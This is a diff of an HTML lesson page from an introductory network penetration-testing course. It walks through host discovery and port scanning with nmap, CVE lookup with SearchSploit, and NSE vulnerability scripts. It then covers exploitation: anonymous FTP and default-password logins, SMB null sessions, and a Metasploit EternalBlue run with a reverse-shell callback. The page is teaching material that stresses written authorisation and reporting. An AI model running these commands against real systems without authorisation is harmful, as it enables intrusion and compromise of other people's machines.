@@ -72,82 +72,98 @@
     <aside class="lesson-side">
       <h4>Module 01 · L0</h4>
       <ul>
-        <li><a href="#intro" class="active">What is Network VAPT?</a></li>
-        <li><a href="#networks">Networks &amp; Subnets</a></li>
-        <li><a href="#ports">Ports &amp; Services</a></li>
-        <li><a href="#recon">Recon with Nmap</a></li>
-        <li><a href="#tools">Ncat &amp; Nessus</a></li>
-        <li><a href="#wrap">Wrap-up &amp; Resources</a></li>
+        <li><a href="#step1" class="active">1. Information Gathering</a></li>
+        <li><a href="#step2">2. Host Discovery</a></li>
+        <li><a href="#step3">3. Port Scanning</a></li>
+        <li><a href="#step4">4. Service Enumeration</a></li>
+        <li><a href="#step5">5. Vulnerability Analysis</a></li>
+        <li><a href="#step6">6. Exploitation</a></li>
+        <li><a href="#tools">7. Ncat &amp; Nessus</a></li>
+        <li><a href="#wrap">8. Wrap-up &amp; Resources</a></li>
       </ul>
     </aside>
 
     <!-- CONTENT -->
     <article class="prose">
+
       <span class="eyebrow">// module 01 · network</span>
       <h1>Network VAPT</h1>
-      <p style="font-size:1.05rem;">Every organisation runs on a network. Every network has a story — of who connects where, what's exposed, and what's been forgotten. Network VAPT is the art of reading that story before the wrong person does.</p>
-
-      <!-- ═══════════════════════════════════════════════ -->
-      <h2 id="intro">What is Network VAPT?</h2>
-
-      <p>Imagine you've just been hired by a company to test their security. You don't know their network. You don't know their servers. You have an IP range, a signed scope document, and a terminal. Your job: find every crack before an attacker does.</p>
-
-      <p>That's <strong>Network VAPT</strong> — Vulnerability Assessment and Penetration Testing applied to networks. It splits neatly into two phases that work together:</p>
-
-      <p><strong>Vulnerability Assessment (VA)</strong> is the systematic process of scanning, identifying, and cataloguing weaknesses. Think of it as a detailed health check — you're not breaking anything, just measuring.</p>
-
-      <p><strong>Penetration Testing (PT)</strong> is where you take those findings and actually try to exploit them, in a controlled way, to understand real-world impact. Can you get in? How far can you go? What data is at risk?</p>
-
-      <div class="callout"><strong>Why bother?</strong> Organisations run services they've forgotten about. Servers go unpatched for years. Default passwords linger. Network VAPT is how defenders discover these issues before attackers stumble on them — and stumble they will.</div>
-
-      <p>The methodology follows a clear arc: <strong>Reconnaissance → Scanning → Enumeration → Exploitation → Reporting</strong>. This module covers the first three in depth — the groundwork every successful test is built on.</p>
-
-
-      <!-- ═══════════════════════════════════════════════ -->
-      <h2 id="networks">Networks &amp; Subnets</h2>
-
-      <p>Before you can probe a network, you need to understand how one is built. Let's go from first principles.</p>
-
-      <h3>What is a network?</h3>
-      <p>A network is a group of devices — computers, servers, printers, phones — that can communicate with each other. In a corporate environment, you might have hundreds or thousands of devices connected. Each one has an <strong>IP address</strong>: a unique numerical label that identifies it on the network.</p>
-
-      <p>IP addresses come in two flavours. <strong>IPv4</strong> is the one you'll see most: four numbers separated by dots, like <code>192.168.1.10</code>. Each number ranges from 0 to 255. IPv6 exists too (and is growing), but IPv4 still dominates most internal networks.</p>
-
-      <h3>Subnets: dividing the space</h3>
-      <p>A large network is rarely one flat pool of addresses. It's divided into <strong>subnets</strong> — smaller logical segments. This is done for security, performance, and organisation. The HR department shouldn't be on the same segment as the production database servers, for example.</p>
-
-      <p>A subnet is defined by two things: a <strong>network address</strong> and a <strong>subnet mask</strong> (or its shorthand, the <strong>CIDR prefix</strong>). You'll often see subnets written like this:</p>
-
+      
+      <p> The Scope: </p>
       <pre><code>192.168.1.0/24</code></pre>
 
-      <p>The <code>/24</code> tells you that 24 bits are the "network" part of the address, and the remaining 8 bits identify individual hosts. A <code>/24</code> subnet gives you 256 total addresses (254 usable — the first is the network address and the last is the broadcast address).</p>
-
-      <pre><code># Common subnet sizes at a glance:
-/24  →  254 hosts   (e.g. 192.168.1.0  – 192.168.1.255)
-/16  →  65,534 hosts (e.g. 10.0.0.0    – 10.255.255.255)
-/8   →  16 million hosts (the entire 10.x.x.x space)
-
-# Private IP ranges (internal networks only):
-10.0.0.0/8
-172.16.0.0/12
-192.168.0.0/16</code></pre>
-
-      <div class="callout"><strong>Pentest relevance:</strong> When you're handed a scope like <code>10.10.10.0/24</code>, you know exactly how many hosts might exist: up to 254. Your first job is figuring out which of them are alive.</div>
-
-      <h3>The OSI model — just enough to matter</h3>
-      <p>You'll hear the OSI model mentioned constantly. It's a conceptual framework that breaks network communication into seven layers. You don't need to memorise all seven for VAPT work, but these three are your daily vocabulary:</p>
-
-      <pre><code>Layer 3 · Network     – IP addresses, routing (packets travel here)
-Layer 4 · Transport   – TCP/UDP, ports (connections happen here)
-Layer 7 · Application – HTTP, SSH, FTP (protocols you'll exploit here)</code></pre>
-
-      <p>Most network attacks target layers 3, 4, and 7. Understanding which layer a vulnerability lives in tells you what tools and techniques apply.</p>
-
+      <p style="font-size:1.05rem;">This is where we'll start from. In most cases, this would be an internal subnet, and you would connect to this network over some kind of VPN solution. You would also see something similar once you have Remote Code Execution (RCE) on a web server and then run the command <code>ifconfig</code>, but we might be getting ahead of ourselves. The premise here is that you are simulating a scenario where an attacker has breached a network, compromised a host, and can now run commands on that host with the intent of attacking the network.</p>
 
       <!-- ═══════════════════════════════════════════════ -->
-      <h2 id="ports">Ports &amp; Services</h2>
+      <h2 id="step1">Step 1: Information Gathering</h2>
+      <p>
+        Although everybody uses the CIDR (Classless Inter-Domain Routing) convention <code>192.168.1.0/24</code> to specify a network, I like to dial it down and undertand what this really means before proceeding. If we put this into any of the online <a href="https://www.calculator.net/ip-subnet-calculator.html" ><u>subnet calculator</u></a>, we can see that:
+        
+        <ul> 
+          <li><code>192.168.1.0</code> is the network address,</li>
+          <li><code>192.168.1.255</code> is the broadcast address,</li>
+          <li>And we could possibly have 254 hosts on the network addressed from <code>192.168.1.1</code> to <code>192.168.1.254</code>.</li>
+        </ul> 
 
-      <p>If an IP address is a building's street address, then <strong>ports</strong> are the individual doors. Each port is a number (0–65535) that represents a specific communication channel on a host. When a service starts — a web server, an SSH daemon, a database — it "listens" on one or more ports.</p>
+        It's time to know thyself. What is the IP of our host? What OS does our host run? Run <code>ifconfig</code> or <code>ipconfig</code> and one would of those would work and answer both of our questions. If your host's IP does not fall in between <code>192.168.1.1</code> and <code>192.168.1.254</code> (like e.g., <code>192.168.1.34</code>), it is quite strange to say the least, but you still may be able to access the network nonethless through some crafty works which we will not cover in this module. 
+
+      </p>
+      <p>
+        Now that you know your IP, your host OS, and the IP range to attack, <strong> it's game time! </strong>
+      </p>
+      <h2 id="step2">Step 2: Host Discovery</h2>
+      <p>Most people would start out with <code>ping</code> and quickly realize that none of the Windows hosts on the network actually responds to the ICMP ping requests, but it's still worth a try since the command runs on both Windows and Unix systems. Pick a random IP from your subnet and fire off a ping:</p>
+
+      <pre><code>ping 192.168.1.24</code></pre>
+
+      <p>A pro tip here is to ask your favourite LLM to generate a loop to ping all the hosts within this network and get it over with.</p>
+
+      <div class="callout warn"><strong>Start Documentation Now: </strong> Create a spreadsheet file and start documenting each hosts that you find and mark if it is alive or dead. The host's status will change over time as new devices connect to and disconnect from the network, but it is better to keep track.</div>
+
+      <p>Let us move beyond ping. From ICMP to TCP. For this, and many of the things we are going to try later, we need <code>nmap</code>. <strong>Nmap</strong> (Network Mapper) is the industry-standard tool for network discovery and security auditing. It was created by Gordon Lyon (Fyodor) and first released in 1997 — and it's still the first tool a pentester reaches for, nearly three decades later. That's not nostalgia; it's because Nmap is genuinely excellent. </p>
+
+      <p>The official home is <a href="https://nmap.org" target="_blank" rel="noopener">nmap.org</a>. The <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">reference guide</a> lives there too — bookmark it now.</p>
+
+      <p>At its core, Nmap sends crafted packets to a target and analyses the responses. The type of packet, the timing, and the interpretation of responses determine what Nmap learns. The default scan sends <strong>SYN packets</strong> (the first step of a TCP handshake) — if the port responds with SYN-ACK, it's open. If RST, it's closed. If nothing comes back, it's filtered.</p>
+
+
+      <p>First, we will do a ping scan over the entire subnet very slowly. </p>
+
+<pre><code>sudo nmap -sn 192.168.1.0/24 -oN live_hosts.nmap -T2 -v </code></pre>
+
+      <p> Fun with flags:</p>
+
+      <ul>
+        <li><code>-sn</code>: We only want to do host discovery right now. No port scanning required. Nmap does port scan by default, hence this flag.</li>
+        <li><code>-oN</code>: Save the output into the file <code>live_hosts.nmap</code> in normal Nmap format. You can also use <code>-oX</code> for XML.</li>
+        <li><code>-T2</code>: T2 is the "Polite" timing as per Nmap docs. If this is too slow for you, please use the default <code>-T3</code> flag.</li>
+        <li><code>-v</code>: This is for verbose output. Helpful for those who are really impatient (like me).</li>
+      </ul>
+
+      <p>Please note that this is a point-in-time scan. The list of live hosts that you now have on your <code>live_hosts.nmap</code> file, is the hosts which are live on the network when you ran the scan. New hosts can connect and old hosts can disconnect. Keep that in mind.</p> 
+
+      <div class="callout warn"><strong>Documentation: </strong> Now you have - Sl.No, Host IP, MAC Address, Live Status and OS. You need - NetBIOS Name, Open ports, Service Name, Service Versions, Vulnerabilties, Known Exploits and much more. </div>
+
+      <h2 id="step3">Step 3: Port Scanning</h2>
+
+      <p>Now that you have an idea of which all hosts are live in the network, it's time to get to know them a little bit. Talking to a host is the same as talking to a stranger. Generally, it's not a good idea to go and start asking their deepest darkest secrets right away. Start with small talks, identify what they like to talk about, do they have any past traumas which you can exploit (scary, right?).</p>
+
+      <p>Let us start by making a list of hosts called <code>hosts.lst</code>, which contains just the IP addresses of the live hosts identitifed in the host discovery phase. We are going to start small, only scanning the top 20 most common ports on each host.</p>
+
+      <pre><code>sudo nmap -sS --top-ports 20 -T2 -Pn -iL hosts.lst -oN top20TCP.nmap</code></pre>
+
+      <p> Fun with flags:</p>
+
+      <ul>
+        <li><code>-sS</code>: TCP Half-open scan is faster, much stealthier than its alternatives and does not open a connection, leaving less logs.</li>
+        <li><code>--top-ports 20</code>: We only want to scan the top 20 most common ports on each host. Increase this to <code>--top-ports 100</code> or <code>--top-ports 1000</code> as you narrow your target list.</li>
+        <li><code>-oN</code>: Save the output into the file <code>live_hosts.nmap</code> in normal Nmap format. You can also use <code>-oX</code> for XML.</li>
+        <li><code>-T2</code>: T2 is the "Polite" timing as per Nmap docs. If this is too slow for you, please use the default <code>-T3</code> flag.</li>
+        <li><code>-v</code>: This is for verbose output. Helpful for those who are really impatient (like me).</li>
+        <li>[Optional] <code>-O</code>: Enable OS detection.
+      </ul>
+
+      <p>An OS, in theory, can potentially use ports numbered from (0–65535) to communicate to other hosts in the network. An <strong>open</strong> port typrically means that a process is using this port to communicate to other hosts, by providing a service. For example, if a host wants to provide a file transfer service, an FTP process will use a socket to connect to a port (usually 21) and listens on that port for incoming connections. Any  hosts on the network can connect to this port and use the file transfer service.</p>
 
       <h3>TCP vs UDP</h3>
       <p>Traffic arrives via two main transport protocols. <strong>TCP</strong> (Transmission Control Protocol) is connection-oriented: it establishes a handshake, confirms delivery, and ensures packets arrive in order. <strong>UDP</strong> (User Datagram Protocol) is fire-and-forget — faster, but no delivery guarantee. Most services you'll encounter in VAPT run on TCP.</p>
@@ -189,28 +205,7 @@ filtered – A firewall is silently dropping packets; you can't tell if it's ope
 
 
       <!-- ═══════════════════════════════════════════════ -->
-      <h2 id="recon">Reconnaissance with Nmap</h2>
-
-      <p>Here's where it gets real. <strong>Nmap</strong> (Network Mapper) is the industry-standard tool for network discovery and security auditing. It was created by Gordon Lyon (Fyodor) and first released in 1997 — and it's still the first tool a pentester reaches for, nearly three decades later. That's not nostalgia; it's because Nmap is genuinely excellent.</p>
-
-      <p>The official home is <a href="https://nmap.org" target="_blank" rel="noopener">nmap.org</a>. The <a href="https://nmap.org/book/man.html" target="_blank" rel="noopener">reference guide</a> lives there too — bookmark it now.</p>
-
-      <h3>How Nmap works</h3>
-      <p>At its core, Nmap sends crafted packets to a target and analyses the responses. The type of packet, the timing, and the interpretation of responses determine what Nmap learns. The default scan sends <strong>SYN packets</strong> (the first step of a TCP handshake) — if the port responds with SYN-ACK, it's open. If RST, it's closed. If nothing comes back, it's filtered.</p>
-
-      <h3>Your first scan</h3>
-      <p>Start simple. Given a target host, this is where you begin:</p>
-
-      <pre><code># Scan the 1000 most common ports on a single host
-nmap 10.10.10.5
-
-# Scan a whole subnet — discover what's alive
-nmap 10.10.10.0/24
-
-# Ping sweep only — just find live hosts, no port scanning
-nmap -sn 10.10.10.0/24</code></pre>
-
-      <p>The default scan is fast and gives you a solid overview. But pentesters rarely stop there.</p>
+      <h2 id="step4">Step 4: Service Enumeration</h2>
 
       <h3>Going deeper with scan types</h3>
 
@@ -312,6 +307,193 @@ nmap --script=smb-vuln-ms17-010,smb-enum-shares 10.10.10.5 -p 445</code></pre>
 
 
       <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="step5">Step 5: Vulnerability Analysis</h2>
+
+      <p>You've gathered intelligence, found live hosts, scanned ports, and enumerated services. Your documentation now has rows of IP addresses, open ports, service names, and version numbers. This is where the real detective work begins. <strong>Vulnerability analysis</strong> is the process of taking that raw data and asking: <em>what can I do with this?</em></p>
+
+      <p>The goal is to map each identified service version to known vulnerabilities. A version number like <code>Apache 2.4.49</code> or <code>OpenSSH 7.2p2</code> is not just metadata — it is a fingerprint that can be cross-referenced against decades of catalogued weaknesses. The chain is simple: open port → service → version → CVE → exploit. Your job in this step is to build that chain for every host.</p>
+
+      <h3>The CVE and CVSS system</h3>
+      <p>Most publicly known vulnerabilities are catalogued under the <strong>CVE</strong> (Common Vulnerabilities and Exposures) system — a standard naming scheme maintained by MITRE. Each entry gets a unique identifier like <code>CVE-2017-0144</code> (EternalBlue) and is assigned a <strong>CVSS score</strong> (Common Vulnerability Scoring System) on a scale from 0 to 10:</p>
+
+      <pre><code>CVSS 9.0 – 10.0  → Critical  — often remote code execution; exploit immediately
+CVSS 7.0 – 8.9   → High      — significant impact; prioritise in your report
+CVSS 4.0 – 6.9   → Medium    — requires specific conditions; worth documenting
+CVSS 0.1 – 3.9   → Low       — limited impact; informational finding
+CVSS 0.0          → Informational / None</code></pre>
+
+      <p>The authoritative source for CVE lookups is the <strong>National Vulnerability Database (NVD)</strong> at <a href="https://nvd.nist.gov" target="_blank" rel="noopener">nvd.nist.gov</a>. Search by CVE ID, product name, or vendor to find the full technical description, CVSS score, affected versions, and links to vendor advisories and patches.</p>
+
+      <div class="callout"><strong>Prioritise ruthlessly:</strong> A real network assessment can turn up dozens of open ports across many hosts. You will almost always find more vulnerabilities than you have time to fully pursue. Work from Critical → High → Medium. A single confirmed Critical finding with a working proof of concept is worth far more in a report than twenty Low-severity informational flags.</div>
+
+      <h3>SearchSploit — offline exploit database</h3>
+      <p><strong>SearchSploit</strong> is the command-line interface to <a href="https://www.exploit-db.com" target="_blank" rel="noopener">Exploit-DB</a>, a curated archive of public exploits and proof-of-concept code maintained by Offensive Security. It runs entirely offline against a local copy of the database — invaluable on air-gapped or restricted networks. When you identify a service version, SearchSploit is your first stop after NVD.</p>
+
+      <pre><code># Search for exploits by product name and version
+searchsploit apache 2.4.49
+searchsploit openssh 7.2
+
+# Search directly by CVE identifier
+searchsploit --cve 2021-44228
+
+# Strict search — only match exact version, not version ranges
+searchsploit -s vsftpd 2.3.4
+
+# Show the full filesystem path to a specific exploit
+searchsploit -p 50383
+
+# Copy an exploit to your current directory to inspect or modify it
+searchsploit -m 50383
+
+# Update the local Exploit-DB copy (run periodically)
+searchsploit -u</code></pre>
+
+      <p>SearchSploit comes pre-installed on Kali Linux. On other systems, install the <code>exploitdb</code> package or clone it from <a href="https://github.com/offensive-security/exploitdb" target="_blank" rel="noopener">GitHub</a>. Before running any exploit code you find, always read it first — public exploit scripts range from clean PoCs to outright malware.</p>
+
+      <h3>Nmap NSE — automated vulnerability checks</h3>
+      <p>Nmap's scripting engine has an entire <code>vuln</code> category dedicated to detecting known weaknesses. These scripts probe services directly — faster than manual lookups but noisier on the wire. Layer them on top of what you already know from Step 4.</p>
+
+      <pre><code># Run all vuln-category scripts against a single host
+sudo nmap --script=vuln -sV 192.168.1.45 -oN vuln_192.168.1.45.nmap
+
+# SMB-specific vulnerability checks — Windows hosts
+sudo nmap --script=smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2020-0796 \
+     -p 445 192.168.1.45
+
+# Check FTP for anonymous login
+nmap --script=ftp-anon -p 21 192.168.1.45
+
+# SSH — enumerate supported algorithms and flag weak ciphers
+nmap --script=ssh2-enum-algos,sshv1 -p 22 192.168.1.45
+
+# HTTP — pull headers, page title, and detect known CMS
+nmap --script=http-headers,http-title,http-server-header \
+     -p 80,443,8080 192.168.1.45
+
+# SNMP — try default community strings (public, private)
+nmap --script=snmp-brute,snmp-info -p 161 -sU 192.168.1.45</code></pre>
+
+      <div class="callout warn"><strong>False positives are real:</strong> Automated tools are not infallible. An NSE script may flag a service as vulnerable based solely on its version number — even if the admin has backported a security patch. Always manually verify every Critical or High finding before writing it into a report. Pasting automated tool output into a report without verification is a fast way to lose a client's trust permanently.</div>
+
+      <h3>Manual verification</h3>
+      <p>For every High or Critical finding from automated tools, verify it manually before reporting. Manual verification might mean checking the vendor's security advisory to confirm exactly which sub-versions are affected, using Ncat to interact with the service and confirming the version banner directly, searching Exploit-DB for a working PoC and checking whether the target meets its prerequisites, or cross-referencing the NVD entry to see whether the CVSS score was calculated for the network attack vector (remotely exploitable) or requires local access.</p>
+
+      <h3>Building your vulnerability matrix</h3>
+      <p>Update the documentation you have been maintaining since Step 2. For each live host, you should now have entries that follow this structure:</p>
+
+      <pre><code># Vulnerability matrix — add these columns to your existing spreadsheet:
+IP Address | Port | Service | Version | CVE ID | CVSS | Severity | Verified | Notes
+
+# Example row:
+192.168.1.45 | 445/TCP | SMB | Windows 7 SP1 | CVE-2017-0144 | 9.3 | Critical | Yes | EternalBlue — NSE confirmed; no patch applied
+
+192.168.1.61 | 21/TCP  | FTP | vsftpd 2.3.4  | CVE-2011-2523 | 10.0 | Critical | Yes | Backdoor on port 6200; searchsploit EDB-ID 17491
+
+192.168.1.22 | 23/TCP  | Telnet | Linux telnetd | —  | Info | Low  | Yes | Cleartext protocol — credentials visible on wire</code></pre>
+
+      <p>This matrix becomes the technical backbone of your penetration test report. By the time you are done with vulnerability analysis, you know exactly which hosts to target first, which vulnerabilities are confirmed, and what the expected impact of each would be. That clarity is what takes us into Step 6.</p>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <h2 id="step6">Step 6: Exploitation</h2>
+
+      <p>Vulnerability analysis tells you where the cracks are. Exploitation is when you actually push on one of those cracks to confirm it gives way. This is the "PT" in VAPT — the <strong>Penetration Testing</strong> half. It is the step that distinguishes a penetration test from a plain vulnerability scan, because it proves a vulnerability is not just theoretically dangerous but <em>actively exploitable</em>.</p>
+
+      <p>At this level, we keep exploitation <em>deliberate and controlled</em>. The goal is not destruction — it is <strong>proof of concept</strong>. You want to demonstrate, in a controlled way, that a vulnerability is real, reproducible, and carries the impact you claimed. Then you document it and move on.</p>
+
+      <div class="callout warn"><strong>Authorisation is everything:</strong> Never attempt to exploit any system without explicit, written authorisation. Exploitation without permission is a criminal offence in virtually every jurisdiction. In a professional VAPT engagement, this is governed by a signed Rules of Engagement (RoE) document that defines exactly what you are allowed to test, and when. In a lab environment, you own the machines. Everywhere else — stop.</div>
+
+      <h3>Low-hanging fruit — misconfiguration exploitation</h3>
+      <p>Before reaching for a framework, look for misconfigurations that require no exploit code at all. These are often the findings that sting clients the most — they are not zero-days, they are basic hygiene failures that have been sitting open, sometimes for years.</p>
+
+      <pre><code># 1. Anonymous FTP — no credentials required
+ncat 192.168.1.61 21
+# The server banner appears. Type the following and press Enter after each line:
+USER anonymous
+PASS test@test.com
+# "230 Login successful" means you are in. List the directory:
+LIST
+# Document: which files are accessible? Are any sensitive (configs, backups, credentials)?</code></pre>
+
+      <pre><code># 2. Telnet — unencrypted, just connect and try default credentials
+ncat 192.168.1.22 23
+# A login prompt appears. Try: admin/admin, root/root, admin/(blank), root/(blank)
+# Note: the entire session — including any credentials you type — is visible
+# as plaintext to anyone capturing packets on the same network segment.</code></pre>
+
+      <pre><code># 3. SMB null session — list shares without any credentials (legacy Windows / Samba)
+smbclient -L //192.168.1.45 -N
+# -L: list available shares, -N: no password (null session)
+# If shares are listed — document their names and attempt to browse each one:
+smbclient //192.168.1.45/SHARENAME -N
+# Once inside: ls (list), get filename (download), put filename (upload)</code></pre>
+
+      <pre><code># 4. Default credentials on web-based management interfaces
+# Routers, IP cameras, printers, NAS devices, and network switches often ship with:
+#   admin:admin  |  admin:password  |  admin:(blank)  |  root:root  |  root:toor
+# Open a browser, navigate to http://192.168.1.1 (or whatever the device IP is).
+# If a login page appears, try the defaults above before attempting anything else.
+# Reference: https://www.routerpasswords.com for vendor-specific defaults</code></pre>
+
+      <h3>Metasploit — the exploitation framework</h3>
+      <p><strong>Metasploit Framework</strong> (MSF) is the most widely used exploitation framework in the world, maintained by Rapid7 and the open-source community. It packages hundreds of known, vetted exploits into a consistent, ready-to-use format. At L0, we introduce the concept and the workflow — hands-on Metasploit use is covered in L1.</p>
+
+      <pre><code># Launch the Metasploit console
+msfconsole
+
+# Search for a module by CVE, vulnerability name, or service
+msf6 > search ms17-010
+msf6 > search vsftpd 2.3.4
+msf6 > search type:exploit name:eternalblue
+
+# Select a module from the search results
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# Review what the module needs
+msf6 (ms17_010_eternalblue) > show options
+
+# Set the target IP address
+msf6 (ms17_010_eternalblue) > set RHOSTS 192.168.1.45
+
+# Set your local IP (for the reverse shell callback)
+msf6 (ms17_010_eternalblue) > set LHOST 192.168.1.10
+
+# Run the exploit
+msf6 (ms17_010_eternalblue) > run</code></pre>
+
+      <p>If the exploit succeeds, Metasploit opens a <strong>Meterpreter session</strong> — an interactive, encrypted shell running inside the target process. From this session you can list running processes, read files, dump password hashes, capture screenshots, and pivot to other hosts. In a pentest, you take a screenshot of the session prompt as your evidence, document what access was achieved, and stop — that is your proof of concept.</p>
+
+      <div class="callout"><strong>What a shell actually means:</strong> Getting a Meterpreter session on one machine does not just mean that machine is compromised. It means you now have a foothold <em>inside the network</em>. From here you can run <code>ipconfig</code> to discover other subnets, <code>arp -a</code> to map neighbouring hosts, and attempt to pivot deeper into network segments that were never directly accessible from outside. One unpatched service can be the entry point to an entire organisation. That is why patch management is not optional.</div>
+
+      <h3>When exploitation fails</h3>
+      <p>A failed exploit is not a failure — it is information. If an NSE script flagged a host as vulnerable but your exploit did not land, several things could be happening: the target may have a partial or backported patch, a WAF or IPS is intercepting your packets before they reach the service, the service version banner was spoofed by a honeypot, or the exploit has prerequisites (architecture, service pack level, specific configuration) that the target does not meet. Document the attempt, note the discrepancy, and mark the finding as <em>Unconfirmed — Exploitation Unsuccessful</em>. Clients want to know what you tried, not just what succeeded.</p>
+
+      <h3>Documenting exploitation — the proof of concept</h3>
+      <p>Every exploitation attempt — successful or not — must be documented. Screenshots are the currency of a pentest report. For each attempt, capture the following:</p>
+
+      <pre><code># PoC documentation template — one entry per finding:
+Finding Title     : Unauthenticated RCE via EternalBlue
+CVE               : CVE-2017-0144
+CVSS Score        : 9.3 (Critical)
+Target            : 192.168.1.45 (Windows 7 SP1, identified in Step 4)
+Port / Service    : 445/TCP — SMB
+Tool Used         : Metasploit — exploit/windows/smb/ms17_010_eternalblue
+Steps to Reproduce:
+  1. Confirm 445/tcp open via nmap -sV 192.168.1.45
+  2. Validate: nmap --script=smb-vuln-ms17-010 -p 445 192.168.1.45
+  3. MSF: use exploit/windows/smb/ms17_010_eternalblue
+     set RHOSTS 192.168.1.45 → set LHOST 192.168.1.10 → run
+Outcome           : Meterpreter session opened as NT AUTHORITY\SYSTEM
+Evidence          : [Screenshot — meterpreter prompt + getuid output]
+Impact            : Full system compromise; lateral movement to adjacent subnets possible
+Recommendation    : Apply Microsoft security bulletin MS17-010 immediately.
+                    Isolate the host from the network until patched.</code></pre>
+
+      <h3>The final output: the report</h3>
+      <p>Full post-exploitation — privilege escalation, credential harvesting, lateral movement, and persistence — is covered starting at L1. But understand this now: the final deliverable of every VAPT engagement is the <strong>report</strong>. It is a structured document containing an executive summary (written for management, no jargon), a technical findings section (your vulnerability matrix, enriched with PoC screenshots and reproduction steps), and a remediation section (prioritised, specific, actionable). The report is what the client actually pays for. The shell is merely the evidence that the report is credible.</p>
+
+
+      <!-- ═══════════════════════════════════════════════ -->
       <h2 id="tools">Ncat &amp; Nessus</h2>
 
       <p>Nmap gives you the map. Two more tools round out your starter kit: <strong>Ncat</strong> for direct service interaction, and <strong>Nessus</strong> for comprehensive vulnerability scanning.</p>
@@ -410,9 +592,16 @@ nmap -sV -oX nmap_results.xml 10.10.10.0/24
 ✓ Ports (0–65535) are how services listen for connections
 ✓ TCP vs UDP — most services use TCP, but don't ignore UDP
 ✓ Nmap discovers hosts, scans ports, detects versions, runs scripts
+✓ CVE + CVSS: every vulnerability has an ID and a 0–10 severity score
+✓ SearchSploit lets you search Exploit-DB offline by product, version, or CVE
+✓ Nmap NSE --script=vuln automates vulnerability checks against live services
+✓ Always verify Critical/High findings manually before reporting them
+✓ Exploitation proves a vulnerability is real — proof of concept, not destruction
+✓ Metasploit packages exploits into a consistent use → set → run workflow
+✓ Every exploitation attempt — successful or not — must be documented
 ✓ Ncat lets you interact directly with services (banner grabbing, file transfer)
 ✓ Nessus automates vulnerability identification with a rich plugin library
-✓ The workflow: discover → enumerate → analyse → report</code></pre>
+✓ The workflow: discover → enumerate → analyse → exploit → document → report</code></pre>
 
       <p>This is the mental model that underpins every network pentest, from a small office to a Fortune 500 infrastructure. The tools scale; the thinking doesn't change.</p>
 
